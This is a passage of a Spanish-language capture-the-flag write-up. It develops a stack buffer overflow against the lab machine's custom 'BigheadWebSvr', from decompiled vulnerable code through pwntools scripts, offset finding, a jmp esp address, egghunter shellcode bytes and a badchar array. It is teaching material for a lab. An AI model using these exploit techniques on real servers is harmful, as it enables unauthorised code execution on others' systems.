+  </span><span class="no">char </span><span class="p">recv_buffer[</span><span class="mi">1003</span><span class="p">]; </span><span class="c1">// [esp+1Dh] [ebp-41Bh] BYREF
+  </span><span class="no">unsigned int </span><span class="p">v6; </span><span class="c1">// [esp+408h] [ebp-30h]
+  </span><span class="no">char </span><span class="o">*</span><span class="p">hex_string; </span><span class="c1">// [esp+40Ch] [ebp-2Ch]
+  </span><span class="no">int </span><span class="p">bytes; </span><span class="c1">// [esp+410h] [ebp-28h]
+  </span><span class="no">int </span><span class="p">send_bytes; </span><span class="c1">// [esp+414h] [ebp-24h]
+  </span><span class="p">SOCKET client_socket; </span><span class="c1">// [esp+418h] [ebp-20h]
+  </span><span class="no">void </span><span class="o">*</span><span class="p">mem; </span><span class="c1">// [esp+41Ch] [ebp-1Ch]
+  </span><span class="no">char </span><span class="o">*</span><span class="p">buf; </span><span class="c1">// [esp+420h] [ebp-18h]
+  </span><span class="no">int </span><span class="p">len; </span><span class="c1">// [esp+424h] [ebp-14h]
+  </span><span class="no">int </span><span class="p">loop_counter; </span><span class="c1">// [esp+428h] [ebp-10h]
+  </span><span class="no">int </span><span class="p">hex_position; </span><span class="c1">// [esp+42Ch] [ebp-Ch]
+
+  </span><span class="p">len </span><span class="o">= </span><span class="mi">524</span><span class="p">;
+  buf </span><span class="o">= </span><span class="p">(</span><span class="no">char </span><span class="o">*</span><span class="p">)</span><span class="no">malloc</span><span class="p">(</span><span class="mi">0x20C</span><span class="no">u</span><span class="p">);
+  mem </span><span class="o">= </span><span class="no">malloc</span><span class="p">(</span><span class="mi">0x400</span><span class="no">u</span><span class="p">);
+  </span><span class="no">memset</span><span class="p">(</span><span class="o">&</span><span class="p">recv_buffer[</span><span class="mi">3</span><span class="p">], </span><span class="mi">0</span><span class="p">, </span><span class="mi">0x3E8</span><span class="no">u</span><span class="p">);
+  </span><span class="no">memset</span><span class="p">(buf, </span><span class="mi">0</span><span class="p">, </span><span class="mi">0x20C</span><span class="no">u</span><span class="p">);
+  result </span><span class="p">=</span><span class="p"> (</span><span class="no">int</span><span class="p">)lpThreadParameter;
+  client_socket </span><span class="o">=</span><span class="p"> (SOCKET)lpThreadParameter;
+  </span><span class="o">if</span><span class="p"> ( send_bytes </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
+  {
+    send_error </span><span class="o">= </span><span class="p">WSAGetLastError();
+    </span><span class="no">printf</span><span class="p">(</span><span class="s">"Send failed with error: </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, send_error);
+    closesocket(client_socket);
+    </span><span class="o">return </span><span class="mi">1</span><span class="p">;
+  }
+  </span><span class="o">else</span><span class="p">
+  {
+    </span><span class="o">while</span><span class="p"> ( lpThreadParameter )
+    {
+      bytes </span><span class="o">= </span><span class="p">recv(client_socket, buf, len, </span><span class="mi">0</span><span class="p">);
+      </span><span class="o">if</span><span class="p"> ( bytes </span><span class="o"><= </span><span class="mi">0</span><span class="p"> )
+      {
+        </span><span class="o">if</span><span class="p"> ( bytes )
+        {
+          recv_error </span><span class="o">= </span><span class="p">WSAGetLastError();
+          </span><span class="no">printf</span><span class="p">(</span><span class="s">"Recv failed with error: </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, recv_error);
+          closesocket(client_socket);
+          </span><span class="o">return </span><span class="mi">1</span><span class="p">;
+        }
+        </span><span class="o">else</span><span class="p">
+        {
+          </span><span class="no">puts</span><span class="p">(</span><span class="s">"Connection closing..."</span><span class="p">);
+          closesocket(client_socket);
+          </span><span class="o">return </span><span class="mi">0</span><span class="p">;
+        }
+      }
+      </span><span class="o">if</span><span class="p"> ( bytes </span><span class="o">> </span><span class="mi">219 </span><span class="o">|| </span><span class="no">strncmp</span><span class="p">(buf, </span><span class="s">"HEAD "</span><span class="p">, </span><span class="mi">5</span><span class="no">u</span><span class="p">) )
+      {
+        </span><span class="o">if</span><span class="p"> ( </span><span class="o">!</span><span class="no">strncmp</span><span class="p">(buf, </span><span class="s">"GET / "</span><span class="p">, </span><span class="mi">6</span><span class="no">u</span><span class="p">) )
+        {
+          send_bytes </span><span class="o">= </span><span class="p">send(client_socket, :</span><span class="o">:</span><span class="p">buf, </span><span class="mi">13635</span><span class="p">, </span><span class="mi">0</span><span class="p">);
+          </span><span class="no">puts</span><span class="p">(</span><span class="s">"Connection closing..."</span><span class="p">);
+          closesocket(client_socket);
+          </span><span class="o">return </span><span class="mi">0</span><span class="p">;
+        }
+        </span><span class="o">else </span><span class="o">if</span><span class="p"> ( </span><span class="o">!</span><span class="no">strncmp</span><span class="p">(buf, </span><span class="s">"GET /coffee"</span><span class="p">, </span><span class="mi">0xB</span><span class="no">u</span><span class="p">) )
+        {
+          send_bytes </span><span class="o">= </span><span class="p">send(
+                         client_socket,
+                         </span><span class="s">"HTTP/1.1 418 I'm A Teapot!</span><span class="mi">\n</span><span class="s">"
+                         "Server: BigheadWebSvr 1.0</span><span class="mi">\n</span><span class="s">"
+                         "Date: Sat, 23 Jun 2018 19:39:57 GMT</span><span class="mi">\n</span><span class="s">"
+                         "Content-Type: text/html</span><span class="mi">\n</span><span class="s">"
+                         "Connection: close</span><span class="mi">\n</span><span class="s">"
+                         "Content-Length: 46</span><span class="mi">\n</span><span class="s">"
+                         "</span><span class="mi">\n</span><span class="s">"
+                         "&ltcenter>&ltimg src='../teapot.gif' width='75%'></span><span class="mi">\n</span><span class="s">"</span><span class="p">,
+                         </span><span class="mi">197</span><span class="p">,
+                         </span><span class="mi">0</span><span class="p">);
+          </span><span class="no">puts</span><span class="p">(</span><span class="s">"Connection closing..."</span><span class="p">);
+          closesocket(client_socket);
+          </span><span class="o">return </span><span class="mi">0</span><span class="p">;
+        }
+        </span><span class="o">else</span><span class="p">
+        {
+          </span><span class="o">if</span><span class="p"> ( </span><span class="o">!</span><span class="no">strncmp</span><span class="p">(buf, </span><span class="s">"POST /"</span><span class="p">, </span><span class="mi">6</span><span class="no">u</span><span class="p">) )
+          {
+            send_bytes </span><span class="o">= </span><span class="p">send(client_socket, :</span><span class="o">:</span><span class="p">buf, </span><span class="mi">13635</span><span class="p">, </span><span class="mi">0</span><span class="p">);
+            </span><span class="no">puts</span><span class="p">(</span><span class="s">"Connection closing..."</span><span class="p">);
+          }
+          </span><span class="o">else</span><span class="p">
+          {
+            send_bytes </span><span class="o">= </span><span class="p">send(
+                           client_socket,
+                           </span><span class="s">"HTTP/1.0 404 Not Found</span><span class="mi">\n</span><span class="s">"
+                           "Server: BigheadWebSvr 1.0</span><span class="mi">\n</span><span class="s">"
+                           "Content-type: text/html</span><span class="mi">\n</span><span class="s">"
+                           "Content-Length: 26</span><span class="mi">\n</span><span class="s">"
+                           "</span><span class="mi">\n</span><span class="s">"
+                           "Error - File Not Found 404</span><span class="mi">\n</span><span class="s">"</span><span class="p">,
+                           </span><span class="mi">121</span><span class="p">,
+                           </span><span class="mi">0</span><span class="p">);
+          }
+          closesocket(client_socket);
+          </span><span class="o">return </span><span class="mi">0</span><span class="p">;
+        }
+      }
+      </span><span class="no">memset</span><span class="p">(recv_buffer, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> 3</span><span class="no">u</span><span class="p">);
+      hex_string </span><span class="o">= </span><span class="p">(</span><span class="no">char </span><span class="o">*</span><span class="p">)</span><span class="no">malloc</span><span class="p">(</span><span class="mi">0xC</span><span class="no">u</span><span class="p">);
+      hex_position </span><span class="o">= </span><span class="mi">6</span><span class="p">;
+      loop_counter </span><span class="o">= </span><span class="mi">0</span><span class="p">;
+      </span><span class="o">while </span><span class="p">( buf[hex_position] </span><span class="o">&& </span><span class="p">buf[hex_position </span><span class="o">+ </span><span class="mi">1</span><span class="p">] )
+      {
+        </span><span class="o">*</span><span class="p">(_WORD </span><span class="o">*</span><span class="p">)recv_buffer </span><span class="o">= *</span><span class="p">(_WORD </span><span class="o">*</span><span class="p">)</span><span class="o">&</span><span class="p">buf[hex_position];
+        v6 </span><span class="o">= </span><span class="no">strtoul</span><span class="p">(recv_buffer, </span><span class="mi">0</span><span class="p">, </span><span class="mi">16</span><span class="p">);
+        </span><span class="no">memset</span><span class="p">(</span><span class="o">&</span><span class="p">hex_string[loop_counter], (</span><span class="no">unsigned </span><span class="na">__int8</span><span class="p">)v6, </span><span class="o">sizeof</span><span class="p">(</span><span class="no">char</span><span class="p">));  
+        hex_position </span><span class="o">+= </span><span class="mi">2</span><span class="p">;
+        </span><span class="o">++</span><span class="p">loop_counter;
+      }
+      Function4(hex_string);
+      send_bytes </span><span class="o">= </span><span class="p">send(client_socket, :</span><span class="o">:</span><span class="p">buf, </span><span class="mi">13635</span><span class="p">,</span><span class="mi"> 0</span><span class="p">);
+      result </span><span class="o">= </span><span class="no">printf</span><span class="p">(</span><span class="s">"HEAD Error Detected!:"</span><span class="p">);
+      </span><span class="o">if</span><span class="p"> ( send_bytes </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
+      {
+        Error </span><span class="o">= </span><span class="p">WSAGetLastError();
+        </span><span class="no">printf</span><span class="p">(</span><span class="s">"Send failed with error: </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, Error);
+        closesocket(client_socket);
+        </span><span class="o">return </span><span class="mi">1</span><span class="p">;
+      }
+    }
+  }
+  </span><span class="o">return </span><span class="p">result;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si miramos la funcion <code class="language-plaintext highlighter-rouge">Function4</code> podemos ver una vulnerabilidad y es que define un <code class="language-plaintext highlighter-rouge">buffer</code> de solo <code class="language-plaintext highlighter-rouge">32 bytes</code> para el parametro que es la ruta y llama a la función <code class="language-plaintext highlighter-rouge">strcpy</code> que es bastante conocida por ser vulnerable a <code class="language-plaintext highlighter-rouge">Buffer Overflow</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">char </span><span class="o">*</span><span class="p">__cdecl </span><span class="na">Function4</span><span class="p">(</span><span class="no">char </span><span class="o">*</span><span class="am">param_1</span><span class="p">)
+{
+  </span><span class="no">char </span><span class="p">buffer[</span><span class="mi">32</span><span class="p">]; </span><span class="c1">// [esp+18h] [ebp-20h] BYREF  
+
+  </span><span class="o">return </span><span class="no">strcpy</span><span class="p">(buffer, param_1);
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Antes de seguir necesitamos solucionar un problema y es que si ejecutamos el <code class="language-plaintext highlighter-rouge">exe</code> nos dice que falta una libreria, podemos simplemente <a href="https://sourceforge.net/projects/mingw/files/MinGW/Base/mingwrt/mingwrt-5.0.2/">descargarla</a> en el directorio</p>
+<a href="/htb/bighead/11.png" target="_blank"><div><p><img src="/htb/bighead/11.png"></p></div></a>
+
+</section>
+
+<section class="post" id="bof-egghunter">
+<br><h3 class="post-title">Buffer Overflow - egghunter</h3><br>
+
+<p class="plain-text">Para debuggear el binario usaremos <a href="https://x64dbg.com/">x32dbg</a> con el plugin <a href="https://github.com/x64dbg/x64dbgpy">x64dbgpy</a> y el modulo <a href="https://github.com/corelan/mona">mona</a>, asi que abrimos el exe <code class="language-plaintext highlighter-rouge">exe</code> y lo corremos, ademas de importar el modulo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">from mona import mona</span>
+</code></pre></div></div><br>
+<a href="/htb/bighead/12.png" target="_blank"><div><p><img src="/htb/bighead/12.png"></p></div></a>
+
+<p class="plain-text">Podemos empezar creando un script que envie una petición de tipo <code class="language-plaintext highlighter-rouge">HEAD</code> a el servidor y en la ruta intentaremos sobreescribir el buffer enviando <code class="language-plaintext highlighter-rouge">100 A's</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote
+
+payload </span><span class="o">=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> * </span><span class="mi">100</span><span class="p">
+
+content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload} </span><span class="s">HTTP/1.1"</span><span class="p">.encode()  
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">8008</span><span class="p">)
+
+shell.sendline(content)
+shell.close()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Tenemos un pequeño problema y es que toma <code class="language-plaintext highlighter-rouge">2</code> caracteres para un solo <code class="language-plaintext highlighter-rouge">byte</code> por lo que en lugar de representarnos un <code class="language-plaintext highlighter-rouge">41</code> como normalmente pasa, nos muestra <code class="language-plaintext highlighter-rouge">AA</code></p>
+<a href="/htb/bighead/14.png" target="_blank"><div><p><img src="/htb/bighead/14.png"></p></div></a>
+
+<p class="plain-text">Para solucionar esto enviaremos solo <code class="language-plaintext highlighter-rouge">50 A's</code> pero haremos un <code class="language-plaintext highlighter-rouge">.hex()</code> para enviarlas en <code class="language-plaintext highlighter-rouge">hexadecimal</code> y asi poder obtener la representacion que necesitamos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote
+
+payload </span><span class="o">= </span><span class="no">b</span><span class="s">"A"</span><span class="o"> * </span><span class="mi">50</span><span class="p">
+
+content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()}</span><span class="s"> HTTP/1.1"</span><span class="p">.encode()  
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">8008</span><span class="p">)
+
+shell.sendline(content)
+shell.close()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si corremos el programa nuevamente sobreescribimos el registro <code class="language-plaintext highlighter-rouge">EIP</code> pero en lugar de ver <code class="language-plaintext highlighter-rouge">AA</code> como antes podemos ver su representación en hexadecimal como <code class="language-plaintext highlighter-rouge">41</code></p>
+<a href="/htb/bighead/15.png" target="_blank"><div><p><img src="/htb/bighead/15.png"></p></div></a>
+
+<p class="plain-text">Necesitamos saber la cantidad de <code class="language-plaintext highlighter-rouge">bytes</code> necesarios antes de llegar a <code class="language-plaintext highlighter-rouge">EIP</code> ya que sera nuestro puntero, creamos una cadena de <code class="language-plaintext highlighter-rouge">50</code> bytes usando <code class="language-plaintext highlighter-rouge">pattern_create</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mona("pattern_create 50")</span>
+</code></pre></div></div><br>
+<a href="/htb/bighead/13.png" target="_blank"><div><p><img src="/htb/bighead/13.png"></p></div></a>
+
+<p class="plain-text">Modificamos el script cambiando las <code class="language-plaintext highlighter-rouge">A's</code> por la cadena especialmente diseñada para encontrar un <code class="language-plaintext highlighter-rouge">offset</code>, corremos de nuevo el programa y nuevamente se corrompe</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote
+
+payload </span><span class="o">= </span><span class="no">b</span><span class="s">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab"</span><span class="p">  
+
+content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()}</span><span class="s"> HTTP/1.1"</span><span class="p">.encode()  
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">8008</span><span class="p">)
+
+shell.sendline(content)
+shell.close()</span>
+</code></pre></div></div><br>
+
+<a href="/htb/bighead/16.png" target="_blank"><div><p><img src="/htb/bighead/16.png"></p></div></a>
+
+<p class="plain-text">Lo que haremos sera usar <code class="language-plaintext highlighter-rouge">pattern_offset</code> para encontrar el offset o bytes basura necesarios, le pasamos como argumento el valor de <code class="language-plaintext highlighter-rouge">EIP</code> y nos dice que son <code class="language-plaintext highlighter-rouge">36</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mona("pattern_offset 41326241")</span>
+</code></pre></div></div><br>
+<a href="/htb/bighead/17.png" target="_blank"><div><p><img src="/htb/bighead/17.png"></p></div></a>
+
+<p class="plain-text">Para comprobarlo en el script enviaremos <code class="language-plaintext highlighter-rouge">36 A's</code> que son las necesarias antes de EIP seguidos de <code class="language-plaintext highlighter-rouge">4 B's</code> que si el calculo es correcto deberia sobreescribir <code class="language-plaintext highlighter-rouge">EIP</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote
+
+offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
+eip </span><span class="o">=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> * </span><span class="mi">4</span><span class="p">
+
+payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">eip
+
+content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()} </span><span class="s">HTTP/1.1"</span><span class="p">.encode()  
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">8008</span><span class="p">)
+
+shell.sendline(content)
+shell.close()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esta vez sobreescribimos el registro <code class="language-plaintext highlighter-rouge">EIP</code> pero tenemos el control del puntero que ahora tiene como valor <code class="language-plaintext highlighter-rouge">42424242</code> que es la representacion en hexadecimal de <code class="language-plaintext highlighter-rouge">BBBB</code></p>
+<a href="/htb/bighead/18.png" target="_blank"><div><p><img src="/htb/bighead/18.png"></p></div></a>
+
+<p class="plain-text">Lo siguiente sera listar los <code class="language-plaintext highlighter-rouge">modulos</code> que parafraseando seran el programa y librerias importadas en ejecución, ahi encontramos el <code class="language-plaintext highlighter-rouge">exe</code> y el <code class="language-plaintext highlighter-rouge">dll</code> sin ninguna proteccion</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mona("modules")</span>
+</code></pre></div></div><br>
+<a href="/htb/bighead/19.png" target="_blank"><div><p><img src="/htb/bighead/19.png"></p></div></a>
+
+<p class="plain-text">Para poder ejecutar nuestro shellcode sera necesario hacer un <code class="language-plaintext highlighter-rouge">jmp esp</code>, con mona buscamos una direccion que haga esa intruccion y aunque en el exe no hay ninguna direccion que salte al <code class="language-plaintext highlighter-rouge">ESP</code> si indicamos como modulo el <code class="language-plaintext highlighter-rouge">dll</code> encontramos varias</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mona("jmp -r esp -m bheadsvr.dll")</span>
+</code></pre></div></div><br>
+<a href="/htb/bighead/20.png" target="_blank"><div><p><img src="/htb/bighead/20.png"></p></div></a>
+
+<p class="plain-text">Tenemos otro problema y es que si despues del <code class="language-plaintext highlighter-rouge">jmp esp</code> enviamos <code class="language-plaintext highlighter-rouge">50</code> o mas bytes el programa no llega a ejecutar <code class="language-plaintext highlighter-rouge">Function4</code> ya que el if pide que sea menor de <code class="language-plaintext highlighter-rouge">219</code> bytes por lo que este ni siquiera se corrompe, enviemos <code class="language-plaintext highlighter-rouge">49</code> por ahora</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32
+
+offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
+jmpesp </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x625012f0</span><span class="p">)
+stack </span><span class="o">= </span><span class="no">b</span><span class="s">"C"</span><span class="o"> * </span><span class="mi">49</span><span class="p">
+
+payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpesp </span><span class="o">+ </span><span class="p">stack
+
+content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()} </span><span class="s">HTTP/1.1"</span><span class="p">.encode()  
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">8008</span><span class="p">)
+
+shell.sendline(content)
+shell.close()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Enviando <code class="language-plaintext highlighter-rouge">49</code> o menos el programa corrompe y almacena nuestras <code class="language-plaintext highlighter-rouge">C's</code> en la pila, sin embargo 49 bytes son muy pocos para un <code class="language-plaintext highlighter-rouge">shellcode</code>, podriamos pensar en volver a <code class="language-plaintext highlighter-rouge">EAX</code> pero no tiene sentido ya que tendriamos incluso menos, solo <code class="language-plaintext highlighter-rouge">36</code> bytes</p>
+<a href="/htb/bighead/21.png" target="_blank"><div><p><img src="/htb/bighead/21.png"></p></div></a>
+
+<p class="plain-text">Para bypassear esta resctricción de espacio podemos jugar con un <code class="language-plaintext highlighter-rouge">egghunter</code>, con mona podemos crear uno que busca la cadena <code class="language-plaintext highlighter-rouge">w00t</code> y pesa apenas <code class="language-plaintext highlighter-rouge">32</code> bytes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mona("egghunter")</span>
+</code></pre></div></div><br>
+<a href="/htb/bighead/22.png" target="_blank"><div><p><img src="/htb/bighead/22.png"></p></div></a>
+
+<p class="plain-text">La idea es simple, enviamos una petición <code class="language-plaintext highlighter-rouge">POST</code> usando como data el <code class="language-plaintext highlighter-rouge">egg</code> 2 veces seguido del <code class="language-plaintext highlighter-rouge">shellcode</code> que seran <code class="language-plaintext highlighter-rouge">100 C's</code>, esto se guardara en algun lugar de la <code class="language-plaintext highlighter-rouge">memoria</code> y cuando saltamos al <code class="language-plaintext highlighter-rouge">ESP</code> podemos ejecutar el <code class="language-plaintext highlighter-rouge">egghunter</code> que buscara el huevo que es <code class="language-plaintext highlighter-rouge">w00t</code> 2 veces y ejecutara lo que esta despues osea el shellcode</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32
+
+egg </span><span class="o">= </span><span class="no">b</span><span class="s">"w00t"</span><span class="o"> * </span><span class="mi">2</span><span class="p">
+shellcode </span><span class="o">= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">100</span><span class="p">
+
+payload </span><span class="o">= </span><span class="p">egg </span><span class="o">+ </span><span class="p">shellcode
+
+content </span><span class="o">= </span><span class="no">b</span><span class="s">"POST / HTTP/1.1</span><span class="mi">\r\n</span><span class="s">" </span><span class="o">+ </span><span class="p">payload
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">8008</span><span class="p">)
+
+shell.sendline(content)
+shell.recv()
+shell.close()
+
+offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
+
+jmpesp </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x625012f0</span><span class="p">)
+
+egghunter  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74</span><span class="s">"</span><span class="p">  
+egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7</span><span class="s">"</span><span class="p">  
+
+payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpesp </span><span class="o">+ </span><span class="p">egghunter
+
+content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()}</span><span class="s"> HTTP/1.1"</span><span class="p">.encode()
+</span><span class="p">
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">8008</span><span class="p">)
+
+shell.sendline(content)
+shell.close()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Como no queremos que se ejecute ahora el egghunter usaremos un <code class="language-plaintext highlighter-rouge">breakpoint</code> en la dirección que ejecuta el <code class="language-plaintext highlighter-rouge">jmp esp</code> para detenernos justo antes de el egghunter</p>
+<a href="/htb/bighead/23.png" target="_blank"><div><p><img src="/htb/bighead/23.png"></p></div></a>
+
+<p class="plain-text">Corremos el programa y nos detenemos en el <code class="language-plaintext highlighter-rouge">jmp esp</code>, lo que haremos sera ver si el <code class="language-plaintext highlighter-rouge">egg</code> se almaceno en algun lugar de la memoria asi que buscamos la string <code class="language-plaintext highlighter-rouge">w00tw00t</code></p>
+<a href="/htb/bighead/24.png" target="_blank"><div><p><img src="/htb/bighead/24.png"></p></div></a>
+
+<p class="plain-text">Como resultado obtenemos un solo <code class="language-plaintext highlighter-rouge">match</code> y en las referencias podemos verlo</p>
+<a href="/htb/bighead/25.png" target="_blank"><div><p><img src="/htb/bighead/25.png"></p></div></a>
+
+<p class="plain-text">Si vemos esa direccion de la memoria en el volcado podemos ver la cadena del <code class="language-plaintext highlighter-rouge">egg</code> que es <code class="language-plaintext highlighter-rouge">w00tw00t</code> y despues las <code class="language-plaintext highlighter-rouge">C's</code> que seria el equivalente a nuestro shellcode</p>
+<a href="/htb/bighead/26.png" target="_blank"><div><p><img src="/htb/bighead/26.png"></p></div></a>
+
+<p class="plain-text">Lo siguiente sera buscar <code class="language-plaintext highlighter-rouge">badchars</code> que puedan hacer que nuestro shellcode no funcione, para ello con mona creamos un <code class="language-plaintext highlighter-rouge">bytearray</code> con los 256 bytes posibles</p>
+<a href="/htb/bighead/27.png" target="_blank"><div><p><img src="/htb/bighead/27.png"></p></div></a>
+
+<p class="plain-text">Modificamos la variable <code class="language-plaintext highlighter-rouge">shellcode</code> de nuestro script por el bytearray y lo corremos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">shellcode </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span class="s">"  
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f</span><span class="s">"  
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f</span><span class="s">"  
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f</span><span class="s">"  
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f</span><span class="s">"  
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf</span><span class="s">"  
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf</span><span class="s">"  
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Repetimos el proceso de buscar la cadena <code class="language-plaintext highlighter-rouge">w00tw00t</code> y lo que nos interesa es la dirección despues de esa cadena justo donde inician los bytes <code class="language-plaintext highlighter-rouge">00 01 02 03 ..</code></p>
